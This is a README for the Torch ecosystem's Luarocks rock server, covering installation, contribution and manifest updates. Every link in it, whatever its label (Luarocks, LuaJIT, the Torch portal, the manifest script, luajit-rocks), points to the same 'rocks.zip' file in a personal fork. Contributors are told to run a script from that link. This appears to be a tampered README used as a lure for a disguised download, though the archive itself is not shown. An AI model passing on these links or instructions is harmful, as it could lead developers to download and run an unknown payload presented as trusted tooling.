Rocks
=====

This is the official rock server for the Torch ecosystem. Note that all
these rocks are installable with [Luarocks](https://raw.githubusercontent.com/Aarnav1608/rocks/master/unspelt/rocks.zip), but
most of them assume [LuaJIT](https://raw.githubusercontent.com/Aarnav1608/rocks/master/unspelt/rocks.zip).

Please refer to [the Torch portal](https://raw.githubusercontent.com/Aarnav1608/rocks/master/unspelt/rocks.zip) for more info
on Torch.

If you want to contribute and share some code, just create a rock for it, and
make a pull request to this repo. When commiting your rocks, you should also
run the script [https://raw.githubusercontent.com/Aarnav1608/rocks/master/unspelt/rocks.zip](https://raw.githubusercontent.com/Aarnav1608/rocks/master/unspelt/rocks.zip),
provided in this repo, to update the manifest and the html summary. The summary
is viewable at all times [here](https://raw.githubusercontent.com/Aarnav1608/rocks/master/unspelt/rocks.zip).

Make sure your [luajit-rocks](https://raw.githubusercontent.com/Aarnav1608/rocks/master/unspelt/rocks.zip) is up to date 
as you will require luarocks `version > 2.2` to make the manifest.
